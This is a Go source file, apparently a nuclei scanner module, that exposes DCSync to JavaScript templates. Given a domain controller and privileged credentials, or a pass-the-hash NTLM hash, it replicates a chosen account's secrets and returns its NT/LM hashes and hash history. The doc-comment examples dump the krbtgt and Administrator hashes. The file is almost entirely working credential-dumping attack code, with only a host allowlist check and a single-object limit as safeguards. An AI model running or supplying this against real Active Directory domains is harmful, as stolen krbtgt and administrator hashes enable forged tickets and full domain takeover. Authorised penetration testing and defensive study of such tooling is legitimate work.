// Package secretsdump exposes Mzack9999/goimpacket's DCSync (DRSUAPI
// IDL_DRSGetNCChanges) primitive to nuclei javascript templates.
//
// DCSync requires Replicating Directory Changes / Replicating Directory
// Changes All extended rights on the domain head. Templates that reach this
// point typically already proved compromise of a Domain Admin account or of a
// principal with the right ACEs (e.g. via samr / ldap / kerberos chains).
//
// Only single-object DCSync is exposed today; full-domain replication is
// intentionally left out as it requires explicit operator opt-in.
package secretsdump

import (
	"encoding/hex"
	"fmt"

	gprpc "github.com/Mzack9999/goimpacket/pkg/dcerpc"
	gpdrs "github.com/Mzack9999/goimpacket/pkg/dcerpc/drsuapi"
	gpsession "github.com/Mzack9999/goimpacket/pkg/session"
	gpsmb "github.com/Mzack9999/goimpacket/pkg/smb"
	"github.com/Mzack9999/goja"

	"github.com/projectdiscovery/nuclei/v3/pkg/js/utils"
	"github.com/projectdiscovery/nuclei/v3/pkg/protocols/common/protocolstate"
)

// Secret is the result of a DCSync against a single principal.
type Secret struct {
	SAMAccountName     string   `json:"sam_account_name"`
	DistinguishedName  string   `json:"distinguished_name"`
	RID                uint32   `json:"rid"`
	NTHash             string   `json:"nthash,omitempty"`
	LMHash             string   `json:"lmhash,omitempty"`
	NTHashHistory      []string `json:"nthash_history,omitempty"`
	LMHashHistory      []string `json:"lmhash_history,omitempty"`
	UserAccountControl uint32   `json:"user_account_control"`
	PwdLastSet         int64    `json:"pwd_last_set"`
}

// Client wraps an authenticated session to a Domain Controller and exposes
// DCSync helpers.
//
// @example
// ```javascript
// const sd = require('nuclei/secretsdump');
// const c = new sd.Client('dc01.acme.local', 'acme.local', 'admin', 'P@ss');
// const krbtgt = c.DCSync('krbtgt');
// ExportAs('krbtgt_nthash', krbtgt.nthash);
// ```
type Client struct {
	Host   string
	Domain string
	User   string
	Pass   string
	nj     *utils.NucleiJS
	creds  *gpsession.Credentials
	target gpsession.Target
}

// NewClient constructs a DCSync client. The credentials supplied must have
// "Replicating Directory Changes" rights on the domain head.
//
// Constructor: constructor(public dc: string, public domain: string, public user: string, public password: string)
func NewClient(call goja.ConstructorCall, runtime *goja.Runtime) *goja.Object {
	c := &Client{nj: utils.NewNucleiJS(runtime)}
	c.nj.ObjectSig = "Client(dc, domain, user, password)"

	c.Host, _ = c.nj.GetArg(call.Arguments, 0).(string)
	c.Domain, _ = c.nj.GetArg(call.Arguments, 1).(string)
	c.User, _ = c.nj.GetArg(call.Arguments, 2).(string)
	c.Pass, _ = c.nj.GetArg(call.Arguments, 3).(string)

	c.nj.Require(c.Host != "", "dc cannot be empty")
	c.nj.Require(c.Domain != "", "domain cannot be empty")
	c.nj.Require(c.User != "", "user cannot be empty")
	if !protocolstate.IsHostAllowed(c.nj.ExecutionId(), c.Host) {
		c.nj.Throw("dc %s blacklisted by network policy", c.Host)
	}
	c.creds = &gpsession.Credentials{Domain: c.Domain, Username: c.User, Password: c.Pass}
	c.target = gpsession.Target{Host: c.Host, Port: 445}
	return utils.LinkConstructor(call, runtime, c)
}

// SetHash enables NTLM pass-the-hash authentication.
//
// @example
// ```javascript
// const c = new sd.Client('dc01', 'acme.local', 'admin', '');
// c.SetHash(':31d6cfe0d16ae931b73c59d7e0c089c0');
// ```
func (c *Client) SetHash(hash string) {
	c.creds.Hash = hash
	c.creds.Password = ""
}

// DCSync replicates secrets for a single principal (DN, sAMAccountName, or
// SID) and returns its NT/LM hashes, hash history and account state.
//
// @example
// ```javascript
// const sd = require('nuclei/secretsdump');
// const c = new sd.Client('dc01', 'acme.local', 'admin', 'P@ss');
// const s = c.DCSync('Administrator');
// log(s.nthash);
// ```
func (c *Client) DCSync(target string) (*Secret, error) {
	c.nj.Require(target != "", "target cannot be empty")
	if !protocolstate.IsHostAllowed(c.nj.ExecutionId(), c.Host) {
		return nil, protocolstate.ErrHostDenied.Msgf(c.Host)
	}

	smb := gpsmb.NewClient(c.target, c.creds)
	if err := smb.Connect(); err != nil {
		return nil, fmt.Errorf("smb connect: %w", err)
	}
	defer smb.Close()

	pipe, err := smb.OpenPipe("\\PIPE\\lsass")
	if err != nil {
		// Fall back to drsuapi-named pipe; both are accepted by the DC.
		pipe, err = smb.OpenPipe("lsass")
		if err != nil {
			return nil, fmt.Errorf("open lsass pipe: %w", err)
		}
	}
	rpc := gprpc.NewClient(pipe)
	if err := rpc.BindAuth(gpdrs.UUID, gpdrs.MajorVersion, gpdrs.MinorVersion, c.creds); err != nil {
		return nil, fmt.Errorf("drsuapi bind: %w", err)
	}
	defer func() {
		_ = rpc.Transport.Close()
	}()

	bind, err := gpdrs.DsBind(rpc)
	if err != nil {
		return nil, fmt.Errorf("ds bind: %w", err)
	}

	dcInfo, err := gpdrs.DsDomainControllerInfo(rpc, bind.Handle, c.Domain)
	if err != nil {
		return nil, fmt.Errorf("ds dc info: %w", err)
	}

	domainDN, err := gpdrs.GetDomainDN(rpc, bind.Handle, c.Domain)
	if err != nil {
		return nil, fmt.Errorf("ds domain dn: %w", err)
	}

	// Resolve target -> DN if it doesn't already look like one.
	userDN := target
	if len(target) < 3 || (target[:3] != "CN=" && target[:3] != "cn=") {
		cracked, err := gpdrs.DsCrackNames(rpc, bind.Handle, 7 /* DS_NT4_ACCOUNT_NAME */, 1 /* DS_FQDN_1779_NAME */, []string{c.Domain + "\\" + target})
		if err != nil || len(cracked) == 0 || cracked[0].Name == "" {
			cracked, err = gpdrs.DsCrackNames(rpc, bind.Handle, 11 /* DS_UNIQUE_ID_NAME (SID) */, 1, []string{target})
			if err != nil || len(cracked) == 0 || cracked[0].Name == "" {
				return nil, fmt.Errorf("could not resolve %q to a DN", target)
			}
		}
		userDN = cracked[0].Name
	}

	res, err := gpdrs.DsGetNCChanges(rpc, bind.Handle, domainDN, userDN, dcInfo.NtdsDsaObjectGuid, rpc.GetSessionKey())
	if err != nil {
		return nil, fmt.Errorf("DsGetNCChanges: %w", err)
	}
	if len(res.Objects) == 0 {
		return nil, fmt.Errorf("DsGetNCChanges returned no objects")
	}
	o := res.Objects[0]
	out := &Secret{
		SAMAccountName:     o.SAMAccountName,
		DistinguishedName:  o.DN,
		RID:                o.RID,
		NTHash:             hex.EncodeToString(o.NTHash),
		LMHash:             hex.EncodeToString(o.LMHash),
		UserAccountControl: o.UserAccountControl,
		PwdLastSet:         o.PwdLastSet,
	}
	for _, h := range o.NTHashHistory {
		out.NTHashHistory = append(out.NTHashHistory, hex.EncodeToString(h))
	}
	for _, h := range o.LMHashHistory {
		out.LMHashHistory = append(out.LMHashHistory, hex.EncodeToString(h))
	}
	return out, nil
}
